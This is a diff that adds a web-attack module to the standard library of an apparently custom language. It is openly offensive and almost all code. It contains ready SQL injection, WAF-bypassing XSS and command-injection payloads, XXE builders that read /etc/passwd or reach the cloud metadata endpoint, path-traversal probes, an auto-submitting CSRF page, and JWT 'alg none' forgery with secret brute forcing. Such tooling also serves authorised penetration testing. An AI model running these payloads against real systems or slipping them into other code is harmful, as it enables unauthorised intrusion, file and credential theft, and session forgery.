@@ -1,0 +1,303 @@
+﻿# Avelyn Standard Library: websec
+# Web Application Attacks Module
+
+import "http"
+import "string"
+import "crypto"
+import "json"
+
+# --- 0. Helpers ---
+
+def websec_buildUrl(url, params) {
+    var res = url
+    var first = true
+    if string["indexOf"](url, "?") >= 0 {
+        first = false
+    }
+    let keys = mapKeys(params)
+    for k in keys {
+        if first {
+            res = res + "?"
+            first = false
+        } else {
+            res = res + "&"
+        }
+        res = res + k + "=" + http["urlEncode"](params[k])
+    }
+    return res
+}
+
+# --- 1. SQL Injection ---
+
+let sqliPayloads = [
+    "' OR 1=1--",
+    "\" OR \"1\"=\"1",
+    "1' OR '1'='1",
+    "1; WAITFOR DELAY '0:0:5'--",
+    "1' AND SLEEP(5)--"
+]
+
+def websec_sqliTest(url, opts) {
+    var param = opts["param"] ?? "id"
+    var method = opts["method"] ?? "GET"
+    
+    var results = []
+    
+    # Baseline
+    let baseResp = http["request"]({"method": method, "url": url})
+    let baseStatus = baseResp["status"]
+    let baseLen = string["len"](baseResp["body"])
+    
+    for payload in sqliPayloads {
+        let testUrl = websec_buildUrl(url, {param: payload})
+        let resp = http["request"]({"method": method, "url": testUrl})
+        let status = resp["status"]
+        let bodyLen = string["len"](resp["body"])
+        
+        var isVuln = false
+        var reason = ""
+        
+        # Simple Error-Based / Boolean-based logic
+        if status == 500 and baseStatus == 200 {
+            isVuln = true
+            reason = "Status code changed to 500"
+        } else if bodyLen != baseLen {
+            isVuln = true
+            reason = "Response length differed (" + toString(baseLen) + " -> " + toString(bodyLen) + ")"
+        }
+        
+        if isVuln {
+            arrayPush(results, {"payload": payload, "reason": reason, "url": testUrl})
+        }
+    }
+    return results
+}
+
+def websec_blindSqli(opts) {
+    # Stub for boolean-based blind SQLi data extraction
+    # Normally this would loop through characters, send true/false conditions, and reconstruct strings.
+    return "Not implemented fully yet, requires complex timing/boolean loop."
+}
+
+# --- 2. Cross-Site Scripting (XSS) ---
+
+def websec_xssPayloads(category="basic") {
+    if category == "basic" {
+        return [
+            "<script>alert(1)</script>",
+            "\"><script>alert(1)</script>",
+            "javascript:alert(1)"
+        ]
+    } else if category == "bypass_waf" {
+        return [
+            "<scr<script>ipt>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "<svg onload=alert(1)>"
+        ]
+    } else if category == "event_handlers" {
+        return [
+            "\" autofocus onfocus=alert(1)",
+            "\" onmouseover=alert(1)"
+        ]
+    }
+    return []
+}
+
+def websec_xssTest(url, opts) {
+    let payloads = opts["payloads"] ?? websec_xssPayloads("basic")
+    var results = []
+    
+    for payload in payloads {
+        let testUrl = websec_buildUrl(url, {"q": payload})
+        let resp = http["request"]({"method": "GET", "url": testUrl})
+        
+        if string["indexOf"](resp["body"], payload) >= 0 {
+            arrayPush(results, {"payload": payload, "reflected": true, "url": testUrl})
+        }
+    }
+    return results
+}
+
+# --- 3. XML External Entity (XXE) ---
+
+def websec_xxePayload(opts) {
+    let type = opts["type"] ?? "file_read"
+    if type == "file_read" {
+        let file = opts["file"] ?? "/etc/passwd"
+        return "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file://" + file + "'>]><root>&test;</root>"
+    } else if type == "ssrf" {
+        let ssrfUrl = opts["url"] ?? "http://169.254.169.254/latest/meta-data/"
+        return "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM '" + ssrfUrl + "'>]><root>&test;</root>"
+    }
+    return ""
+}
+
+# --- 4. Path Traversal ---
+
+def websec_traversalTest(url, opts) {
+    var param = opts["param"] ?? "file"
+    let targets = opts["targets"] ?? ["/etc/passwd", "C:/Windows/win.ini"]
+    let depths = [3, 5, 8]
+    
+    var results = []
+    
+    for target in targets {
+        for depth in depths {
+            var prefix = ""
+            var i = 0
+            while i < depth {
+                prefix = prefix + "../"
+                i = i + 1
+            }
+            
+            let payload = prefix + target
+            let testUrl = websec_buildUrl(url, {param: payload})
+            let resp = http["request"]({"method": "GET", "url": testUrl})
+            let body = resp["body"]
+            
+            var isVuln = false
+            if string["indexOf"](body, "root:x:0:0:") >= 0 {
+                isVuln = true
+            } else if string["indexOf"](body, "[extensions]") >= 0 {
+                isVuln = true
+            }
+            
+            if isVuln {
+                arrayPush(results, {"payload": payload, "target": target, "url": testUrl})
+            }
+        }
+    }
+    return results
+}
+
+# --- 5. Command Injection & SSRF ---
+
+def websec_cmdInjTest(url, opts) {
+    let payloads = opts["payloads"] ?? ["; id", "| whoami", "`id`", "$(id)"]
+    let param = opts["param"] ?? "host"
+    var results = []
+    
+    for payload in payloads {
+        let testUrl = websec_buildUrl(url, {param: payload})
+        let resp = http["request"]({"method": "GET", "url": testUrl})
+        let body = resp["body"]
+        
+        # Check for typical command outputs
+        if string["indexOf"](body, "uid=") >= 0 or string["indexOf"](body, "root") >= 0 {
+            arrayPush(results, {"payload": payload, "url": testUrl})
+        }
+    }
+    return results
+}
+
+def websec_ssrfTest(url, opts) {
+    let callback = opts["callback_url"] ?? "http://localhost:8000/ssrf_callback"
+    let param = opts["param"] ?? "url"
+    
+    let testUrl = websec_buildUrl(url, {param: callback})
+    http["request"]({"method": "GET", "url": testUrl})
+    
+    return {"status": "Request sent to " + testUrl + ", check your listener at " + callback}
+}
+
+# --- 6. CSRF ---
+
+def websec_csrfDetect(url) {
+    # Simple heuristic to detect forms without anti-CSRF tokens
+    let resp = http["request"]({"method": "GET", "url": url})
+    let body = resp["body"]
+    
+    var hasForm = string["indexOf"](body, "<form") >= 0
+    var hasToken = string["indexOf"](string["toLower"](body), "csrf") >= 0
+    
+    return {
+        "csrf_token_present": hasToken,
+        "vulnerable": (hasForm and not hasToken)
+    }
+}
+
+def websec_csrfPoC(opts) {
+    let action = opts["action"] ?? "http://target.com/update"
+    let method = opts["method"] ?? "POST"
+    let fields = opts["fields"] ?? {}
+    
+    var html = "<html>\n  <body>\n    <form action=\"" + action + "\" method=\"" + method + "\">\n"
+    
+    let keys = mapKeys(fields)
+    for k in keys {
+        html = html + "      <input type=\"hidden\" name=\"" + k + "\" value=\"" + fields[k] + "\" />\n"
+    }
+    
+    html = html + "      <input type=\"submit\" value=\"Submit request\" />\n    </form>\n"
+    html = html + "    <script>\n      document.forms[0].submit();\n    </script>\n  </body>\n</html>"
+    
+    return html
+}
+
+# --- 7. JWT Attacks ---
+
+def websec_jwtAttack(token, opts) {
+    let parts = string["split"](token, ".")
+    if arrayLen(parts) != 3 {
+        return {"error": "Invalid JWT format"}
+    }
+    
+    var results = {}
+    
+    # 1. Algorithm None Attack
+    if opts["alg_none"] == true {
+        let b64Hdr = string["replace"](string["replace"](parts[0], "-", "+"), "_", "/")
+        let headerBytes = crypto["base64Decode"](b64Hdr)
+        
+        var headerStr = ""
+        if headerBytes != null {
+            for b in headerBytes {
+                headerStr = headerStr + charFromCode(b)
+            }
+        }
+        print("DEBUG headerStr: " + headerStr)
+        
+        var header = json["loads"](headerStr)
+        if header != null {
+            header["alg"] = "none"
+            let newHdrB64 = crypto["base64Encode"](json["dumps"](header))
+            let cleanHdr = string["replace"](string["replace"](string["replace"](newHdrB64, "=", ""), "+", "-"), "/", "_")
+            results["alg_none"] = cleanHdr + "." + parts[1] + "."
+        }
+    }
+    
+    # 2. Secret Brute Forcing
+    let wordlist = opts["brute_secret"]
+    if wordlist != null and arrayLen(wordlist) > 0 {
+        let headerAndPayload = parts[0] + "." + parts[1]
+        let originalSig = parts[2]
+        
+        for secret in wordlist {
+            let mac = crypto["hmac"]("sha256", secret, headerAndPayload)
+            let macB64 = string["replace"](string["replace"](string["replace"](crypto["base64Encode"](mac), "=", ""), "+", "-"), "/", "_")
+            
+            if macB64 == originalSig {
+                results["cracked_secret"] = secret
+                break
+            }
+        }
+    }
+    
+    return results
+}
+
+# --- Export Module ---
+
+let websec = {
+    "sqliTest": websec_sqliTest,
+    "blindSqli": websec_blindSqli,
+    "xssPayloads": websec_xssPayloads,
+    "xssTest": websec_xssTest,
+    "xxePayload": websec_xxePayload,
+    "traversalTest": websec_traversalTest,
+    "cmdInjTest": websec_cmdInjTest,
+    "ssrfTest": websec_ssrfTest,
+    "csrfDetect": websec_csrfDetect,
+    "csrfPoC": websec_csrfPoC,
+    "jwtAttack": websec_jwtAttack
+}
